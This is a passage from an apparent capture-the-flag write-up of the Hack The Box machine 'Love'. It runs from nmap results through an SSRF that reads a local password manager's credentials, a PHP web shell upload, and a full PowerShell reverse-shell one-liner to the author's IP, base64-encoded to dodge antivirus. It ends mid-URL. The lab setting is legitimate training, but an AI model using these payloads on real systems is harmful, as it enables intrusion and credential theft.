</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE      VERSION
</span></span><span class=line><span class=cl>80/tcp    open  http         Apache httpd 2.4.46 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1j PHP/7.3.27<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.46 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Voting System using PHP
</span></span><span class=line><span class=cl>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class=o>(</span>OpenSSL/1.1.1j PHP/7.3.27<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.46 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>staging.love.htb/organizationName<span class=o>=</span>ValentineCorp/stateOrProvinceName<span class=o>=</span>m/countryName<span class=o>=</span>in
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-01-18T14:00:16
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2022-01-18T14:00:16
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds Windows <span class=m>10</span> Pro <span class=m>19042</span> microsoft-ds <span class=o>(</span>workgroup: WORKGROUP<span class=o>)</span>
</span></span><span class=line><span class=cl>3306/tcp  open  mysql?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Host <span class=s1>&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
</span></span><span class=line><span class=cl>5000/tcp  open  http         Apache httpd 2.4.46 <span class=o>(</span>OpenSSL/1.1.1j PHP/7.3.27<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.46 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>403</span> Forbidden
</span></span><span class=line><span class=cl>5040/tcp  open  unknown
</span></span><span class=line><span class=cl>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>LOVE
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2021-04-11T14:39:19
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-04-10T14:39:19
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class=p>;</span> +21m37s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl>7680/tcp  open  pando-pub?
</span></span><span class=line><span class=cl>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>49664/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49665/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49666/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49667/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49668/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49669/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl>49670/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port3306-TCP:V<span class=o>=</span>7.91%I<span class=o>=</span>7%D<span class=o>=</span>8/8%Time<span class=o>=</span>610FF878%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>NUL
</span></span><span class=line><span class=cl>SF:L,4A,<span class=s2>&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
</span></span></span><span class=line><span class=cl><span class=s2>...[SNIP]...
</span></span></span><span class=line><span class=cl><span class=s2>Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Host script results:
</span></span></span><span class=line><span class=cl><span class=s2>|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
</span></span></span><span class=line><span class=cl><span class=s2>| smb-os-discovery: 
</span></span></span><span class=line><span class=cl><span class=s2>|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
</span></span></span><span class=line><span class=cl><span class=s2>|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span></span><span class=line><span class=cl><span class=s2>|   Computer name: Love
</span></span></span><span class=line><span class=cl><span class=s2>|   NetBIOS computer name: LOVE\x00
</span></span></span><span class=line><span class=cl><span class=s2>|   Workgroup: WORKGROUP\x00
</span></span></span><span class=line><span class=cl><span class=s2>|_  System time: 2021-08-08T08:53:41-07:00
</span></span></span><span class=line><span class=cl><span class=s2>| smb-security-mode: 
</span></span></span><span class=line><span class=cl><span class=s2>|   account_used: &lt;blank&gt;
</span></span></span><span class=line><span class=cl><span class=s2>|   authentication_level: user
</span></span></span><span class=line><span class=cl><span class=s2>|   challenge_response: supported
</span></span></span><span class=line><span class=cl><span class=s2>|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class=line><span class=cl><span class=s2>| smb2-security-mode: 
</span></span></span><span class=line><span class=cl><span class=s2>|   2.02: 
</span></span></span><span class=line><span class=cl><span class=s2>|_    Message signing enabled but not required
</span></span></span><span class=line><span class=cl><span class=s2>| smb2-time: 
</span></span></span><span class=line><span class=cl><span class=s2>|   date: 2021-08-08T15:53:43
</span></span></span><span class=line><span class=cl><span class=s2>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=s2>Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds
</span></span></span></code></pre></div><p>Most notable services are:</p><ul><li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li><li>SMB on port 445, good start.</li><li>A MySQL server on port 3306, I will stay away from this for now because IP block</li><li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li></ul><p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p><p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ sudo <span class=nb>echo</span> <span class=s1>&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3><p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ smbclient -N -L //10.10.10.239 
</span></span><span class=line><span class=cl>session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id=tcp-5000>TCP 5000<a class=anchor aria-hidden=true href=#tcp-5000>#</a></h3><p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p><p><div class=img-container><img src=imgs/image-20210809005411183.png alt=image-20210809005411183></div></p><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>Visiting port 80 with the IP or the hostname returns the same content.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ <span class=k>for</span> i in 10.10.10.239 www.love.htb<span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> -n <span class=s2>&#34;</span><span class=nv>$i</span><span class=s2> &#34;</span><span class=p>;</span> curl -s <span class=nv>$i</span> <span class=p>|</span> wc -c<span class=p>;</span> <span class=k>done</span>                      
</span></span><span class=line><span class=cl>10.10.10.239 <span class=m>4388</span>
</span></span><span class=line><span class=cl>www.love.htb <span class=m>4388</span>
</span></span></code></pre></div><p>On the browser, the site displays a login form of a Voting System app.</p><p><div class=img-container><img src=imgs/image-20210809003519382.png alt=image-20210809003519382></div></p><p>Trying some random IDs and common passwords didn&rsquo;t work here.</p><p><div class=img-container><img src=imgs/image-20210809004024045.png alt=image-20210809004024045></div></p><h4 id=gobuster>Gobuster<a class=anchor aria-hidden=true href=#gobuster>#</a></h4><p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is <code>/admin</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class=nv>40</span>                                                                                                                                                           
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://www.love.htb/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>40</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              txt,php
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Add Slash:               <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/cgi-bin/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>
</span></span><span class=line><span class=cl>/admin/               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 6198<span class=o>]</span>
</span></span><span class=line><span class=cl>/includes/            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2261<span class=o>]</span>
</span></span><span class=line><span class=cl>/plugins/             <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2490<span class=o>]</span>
</span></span><span class=line><span class=cl>/images/              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2719<span class=o>]</span>
</span></span><span class=line><span class=cl>/logout.php           <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; index.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/login.php            <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; index.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/webalizer/           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/home.php             <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; index.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4388<span class=o>]</span>             
</span></span><span class=line><span class=cl>/phpmyadmin/          <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/icons/               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 74798<span class=o>]</span>            
</span></span><span class=line><span class=cl>/preview.php          <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; index.php<span class=o>]</span>
</span></span><span class=line><span class=cl>/examples/            <span class=o>(</span>Status: 503<span class=o>)</span> <span class=o>[</span>Size: 402<span class=o>]</span>              
</span></span><span class=line><span class=cl>/dist/                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1389<span class=o>]</span>             
</span></span><span class=line><span class=cl>/tcpdf/               <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2710<span class=o>]</span>             
</span></span><span class=line><span class=cl>/licenses/            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 421<span class=o>]</span>              
</span></span><span class=line><span class=cl>/server-status/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 421<span class=o>]</span>              
</span></span><span class=line><span class=cl>/con.php              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/con/                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/con.txt              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/aux/                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/aux.php              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>/aux.txt              <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 302<span class=o>]</span>              
</span></span><span class=line><span class=cl>                                                             
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2021/08/08 13:18:01 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><h4 id=admin>/admin<a class=anchor aria-hidden=true href=#admin>#</a></h4><p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p><p><div class=img-container><img src=imgs/image-20210809003454272.png alt=image-20210809003454272></div></p><p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p><h3 id=tcp-80---staginglovehtb>TCP 80 - staging.love.htb<a class=anchor aria-hidden=true href=#tcp-80---staginglovehtb>#</a></h3><p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p><p><div class=img-container><img src=imgs/image-20210809010051350.png alt=image-20210809010051350></div></p><p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p><p><div class=img-container><img src=imgs/image-20210809010747052.png alt=image-20210809010747052></div></p><p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>80</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>80</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.51<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.239<span class=o>]</span> <span class=m>49806</span>
</span></span><span class=line><span class=cl>GET /iamf HTTP/1.1
</span></span><span class=line><span class=cl>Host: 10.10.14.51
</span></span><span class=line><span class=cl>Accept: */*
</span></span></code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p><p>Playing a bit with it reveals that it can render HTML.</p><p><div class=img-container><img src=imgs/image-20210809014613874.png alt=image-20210809014613874></div></p><p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p><h3 id=tcp-443---website>TCP 443 - Website<a class=anchor aria-hidden=true href=#tcp-443---website>#</a></h3><p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p><p><div class=img-container><img src=imgs/image-20210809005318725.png alt=image-20210809005318725></div></p><p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p><p><div class=img-container><img src=imgs/image-20210809012934262.png alt=image-20210809012934262></div></p><p><div class=img-container><img src=imgs/image-20210809012945191.png alt=image-20210809012945191></div></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-phoebe>Shell as phoebe<a class=anchor aria-hidden=true href=#shell-as-phoebe>#</a></h3><h4 id=ssrf>SSRF<a class=anchor aria-hidden=true href=#ssrf>#</a></h4><p>The behavior of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).</p><p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p><p><div class=img-container><img src=imgs/image-20210809033303050.png alt=image-20210809033303050></div></p><p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from <code>127.0.0.1</code>.</p><p>Assuming there is an index file, I try to submit <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> , and the file is exist.</p><p><div class=img-container><img src=imgs/image-20210809034759102.png alt=image-20210809034759102></div></p><p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p><p><div class=img-container><img src=imgs/image-20210809034943436.png alt=image-20210809034943436></div></p><p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p><p><div class=img-container><img src=imgs/image-20210809033828889.png alt=image-20210809033828889></div></p><p>I can use that creds to access the admin dashboard.</p><p><div class=img-container><img src=imgs/image-20210809034300363.png alt=image-20210809034300363></div></p><h4 id=php-webshell>PHP webshell<a class=anchor aria-hidden=true href=#php-webshell>#</a></h4><p>On <code>admin/voters.php</code>, there is a photo upload feature.</p><p><div class=img-container><img src=imgs/image-20210809035502402.png alt=image-20210809035502402></div></p><p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p><p><div class=img-container><img src=imgs/image-20210809040225250.png alt=image-20210809040225250></div></p><p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p><p><div class=img-container><img src=imgs/image-20210809041027772.png alt=image-20210809041027772></div></p><p>The uploaded web shell is accessible at <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p><p><div class=img-container><img src=imgs/image-20210809040810276.png alt=image-20210809040810276></div></p><h4 id=interactive-shell-access>Interactive shell access<a class=anchor aria-hidden=true href=#interactive-shell-access>#</a></h4><p>To get an interactive shell I will use a PowerShell one-liner reverse shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ cat exploits/revshell.ps1
</span></span><span class=line><span class=cl><span class=nv>$client</span> <span class=o>=</span> New-Object System.Net.Sockets.TCPClient<span class=o>(</span><span class=s1>&#39;10.10.14.51&#39;</span>,53<span class=o>)</span><span class=p>;</span><span class=nv>$stream</span> <span class=o>=</span> <span class=nv>$client</span>.GetStream<span class=o>()</span><span class=p>;</span><span class=o>[</span>byte<span class=o>[]]</span><span class=nv>$bytes</span> <span class=o>=</span> 0..65535<span class=p>|</span>%<span class=o>{</span>0<span class=o>}</span><span class=p>;</span><span class=k>while</span><span class=o>((</span><span class=nv>$i</span> <span class=o>=</span> <span class=nv>$stream</span>.Read<span class=o>(</span><span class=nv>$bytes</span>, 0, <span class=nv>$bytes</span>.Length<span class=o>))</span> -ne 0<span class=o>){</span><span class=p>;</span><span class=nv>$data</span> <span class=o>=</span> <span class=o>(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class=o>)</span>.GetString<span class=o>(</span><span class=nv>$bytes</span>,0, <span class=nv>$i</span><span class=o>)</span><span class=p>;</span><span class=nv>$sendback</span> <span class=o>=</span> <span class=o>(</span>iex <span class=nv>$data</span> 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> Out-String <span class=o>)</span><span class=p>;</span><span class=nv>$sendback2</span> <span class=o>=</span> <span class=nv>$sendback</span> + <span class=s1>&#39;PS &#39;</span> + <span class=o>(</span><span class=nb>pwd</span><span class=o>)</span>.Path + <span class=s1>&#39;&gt; &#39;</span><span class=p>;</span><span class=nv>$sendbyte</span> <span class=o>=</span> <span class=o>([</span>text.encoding<span class=o>]</span>::ASCII<span class=o>)</span>.GetBytes<span class=o>(</span><span class=nv>$sendback2</span><span class=o>)</span><span class=p>;</span><span class=nv>$stream</span>.Write<span class=o>(</span><span class=nv>$sendbyte</span>,0,<span class=nv>$sendbyte</span>.Length<span class=o>)</span><span class=p>;</span><span class=nv>$stream</span>.Flush<span class=o>()}</span><span class=p>;</span><span class=nv>$client</span>.Close<span class=o>()</span>
</span></span></code></pre></div><p>Because it is a Windows machine, I will encoded it with base64 to avoid AV.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ cat exploits/revshell.ps1<span class=p>|</span> iconv -t UTF-16LE<span class=p>|</span> base64 -w0
</span></span><span class=line><span class=cl><span class=nv>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class=o>=</span>
</span></span></code></pre></div><p>I will setup a listener and leverage the web shell to execute my payload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>http://www.love.htb/images/shell.php?f<span class=o>=</span>powershell.exe -enc <span class=nv>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwA